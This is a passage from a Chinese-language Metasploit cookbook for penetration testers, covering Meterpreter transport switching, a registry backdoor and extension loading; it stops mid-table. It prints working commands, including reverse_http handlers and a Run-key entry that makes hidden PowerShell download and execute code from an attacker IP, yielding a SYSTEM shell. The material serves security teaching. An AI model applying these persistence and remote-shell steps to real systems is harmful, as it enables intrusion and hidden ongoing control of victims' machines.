
3. 添加新的传输机制可以让 Metasploit 更长时间保持会话活跃。要添加新的传输机制，我们可以使用 transport 命令，后跟正在使用的传输机制：

```
meterpreter > transport add -t reverse_http -l 192.168.216.5 -p 8080 -to 500 -rt 30000 -rw 5000
[*] Adding new transport ...
[+] Successfully added reverse_http transport.
meterpreter >
```

4. 我们使用 -t 选项来指定要添加的传输类型。可用的类型有 bind_tcp、reverse_tcp、reverse_http 和 reverse_https：

- The -l option is used to set the LHOST
- The -p option is used for the LPORT
- The -to option is used to specify the communication timeout in seconds
- The -rt option is used to set the retry total parameter in seconds, and should be higher than -rw
- The -rw option is used to set the retry wait parameter in seconds, and should be less than -rt

5. 现在，当我们列出可用的传输机制时，应该能看到我们新创建的 reverse_http 传输机制：

```
meterpreter > transport list
Session Expiry : @ 2017-11-25 12:05:54

ID  Curr  URL          Comms  T/O  Retry Total  Retry Wait
--  ----  -----------  -----  ---  -----------  ----------
1   http://192.168.216.5:8080/8P8a9wEtFOLZsdiwg6H7kwzzyj7QnFNN2_cDFwbfyweSR-V3ufLjkz4GofSWJDDaeZonEslz6DLcooyTrQqx502GYiWIN4_Clb3TdqrR92nUaSU-pCEgiScRhrmUnfN/ 500 30000 500
2   *   tcp://192.168.216.5:4444 300 3600 10

meterpreter >
```

6. 要更改传输机制，我们首先启动通用有效载荷处理程序，并将有效载荷设置为传输机制中使用的相同有效载荷：

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(psexec) > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf exploit(handler) > set LPORT 8080
LPORT => 8080
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] Started HTTP reverse handler on
http://0.0.0.0:8080/
[*] Starting the payload handler...
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > transport next
[*] Changing to next transport ...
[+] Successfully changed to the next transport,
killing current session.

[*] 192.168.216.10 - Meterpreter session 1 closed.
Reason: User exit

[*] 192.168.216.10:49352 (UUID:
f0ff1af7012d14e2/x86=1/windows=1/2017-11-18T12:05:54Z)
Attaching orphaned/stageless session ...
[*] Meterpreter session
2 opened (192.168.216.5:8080 -> 192.168.216.10:49352)
at 2017-11-18 12:24:33 +0000

msf exploit(handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

从输出中可以看到，我们已成功使用 transport next 命令切换到列表中的下一个传输机制。要切换到上一个传输机制，只需使用 transport prev 命令即可。

## 与注册表交互

注册表是系统定义的数据库，用于存储配置系统供一个或多个用户、应用程序和硬件设备所需的信息。

### 准备工作

注册表中存储的数据因 Microsoft Windows 版本而异，因此在与目标系统交互时需要考虑这一点。

通过查看注册表，您可以找到已使用过的文件、使用 Internet Explorer 访问过的网站、使用的程序、使用的 USB 设备等等。

### 如何操作...

- 1. 要与目标机器的注册表交互，我们将使用 reg 命令，但在开始使用它之前，让我们先查看可用选项：

```
meterpreter > reg
Usage: reg [command] [options]
```

与目标机器的注册表交互。以下是选项：

- -d <opt>: The data to store in the registry value
- -h: Help menu
- -k <opt>: The registry key path (for example, HKLM\Software\Foo)
- -r <opt>: The remote machine name to connect to (with current process credentials)
- -t <opt>: The registry value type (for example, REG_SZ)
- -v <opt>: The registry value name (for example, Stuff)
- -w: Sets the KEY_WOW64 flag and valid values (32/64)

以下是命令：

- enumkey: Enumerates the supplied registry key (-k <key>)
- createkey: Creates the supplied registry key (-k <key>)
- deletekey: Deletes the supplied registry key (-k <key>)
- queryclass: Queries the class of the supplied key (-k <key>)
- setval: Sets a registry value (-k <key> -v <val> -d <data>)
- deleteval: Deletes the supplied registry value (`-k <key> -v <val>`)
- queryval: Queries the data contents of a value (`-k <key> -v <val>`)

正如您所见，reg 命令允许我们完全控制注册表，这表明掌握注册表可以获得的强大能力。

作为示例，在本教程中，我们将使用 reg 命令通过 Script Web Delivery 漏洞利用模块创建注册表后门。

首先，我们需要设置一个 Web 服务器来提供我们的 PowerShell 有效载荷：

```
msf exploit(web_delivery) > set SRVHOST 192.168.216.5
SRVHOST => 192.168.216.5
msf exploit(web_delivery) > set URIPATH /
URIPATH => /
msf exploit(web_delivery) > show targets

Exploit targets:

Id Name
-- ----
0 Python
1 PHP
2 PSH
3 Regsvr32
4 PSH (Binary)

msf exploit(web_delivery) > set TARGET 2
TARGET => 2
msf exploit(web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(web_delivery) > exploit
...

msf exploit(web_delivery) >
```

- 2. 接下来，我们将使用 reg 命令创建一个新的注册表键，该键将在用户登录机器时运行 PowerShell shell 有效载荷：

```
meterpreter > reg setval -k
HKLM\\software\\microsoft\\windows\\currentversion
\\run -v Power -d "powershell.exe -nop -w hidden
-c $R=new-object
net.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();
$R.Proxy.Credentials=[Net.CredentialCache]::
DefaultCredentials;IEX
$R.downloadstring('http://192.168.216.5:8080/');"
Successfully set Power of REG_SZ.
meterpreter >
```

- 3. 要枚举注册表键，我们也可以使用 reg 命令以及 enumkey 选项，后跟 -k 和我们要枚举的键：

```
meterpreter > reg enumkey -k
HKLM\\software\\microsoft\\windows\\currentversion
\\run
Enumerating: HKLM\software\microsoft\windows
\currentversion\run

Values (2):

VBoxTray
Power
```

- 4. 要显示值的数据内容，我们可以使用 reg 命令与 queryval 选项，后跟 -k 指定注册表键，以及 -v 指定要查询的值：

```
meterpreter > reg queryval -k
HKLM\\software\\microsoft\\windows\\currentversion
\\run -v Power
Key: HKLM\software\microsoft\windows\currentversion
\run
Name: Power
Type: REG_SZ
Data: powershell.exe -nop -w hidden -c $R=new-object
net.webclient;$R.proxy=[Net.WebRequest]::
GetSystemWebProxy();
$R.Proxy.Credentials=[Net.CredentialCache]::
DefaultCredentials;IEX
$R.downloadstring('http://192.168.216.5:8080/');
meterpreter >
```

- 5. 现在我们已经建立了注册表后门，只需让机器重新启动，我们就会获得一个具有系统权限的远程 shell：

```
msf exploit(web_delivery) >
[*] Sending stage (179267 bytes) to 192.168.216.10
[*] Meterpreter session 2 opened
(192.168.216.5:4444 -> 192.168.216.10:49379) at
2017-11-18 10:06:39 -0500
msf exploit(web_delivery) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

太棒了！正如您所期望的，Metasploit Framework 为我们提供了所有必要的工具来模仿攻击者并测试最常见的持久化方法。

## 加载框架插件

Meterpreter 允许我们使用多个 Meterpreter 扩展，这些扩展为我们提供了增强功能，例如执行 PowerShell 和 Python 命令、创建交互式 PowerShell 提示、执行 LAN 攻击、嗅探流量等等。

### 如何操作...

- 1. 在本教程中，我们将首先使用 load powershell 命令加载 PowerShell 扩展，并使用 help 命令查看向 Meterpreter 会话添加了哪些命令：

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > help powershell

Powershell Commands
===================

Command Description
------- -----------
```
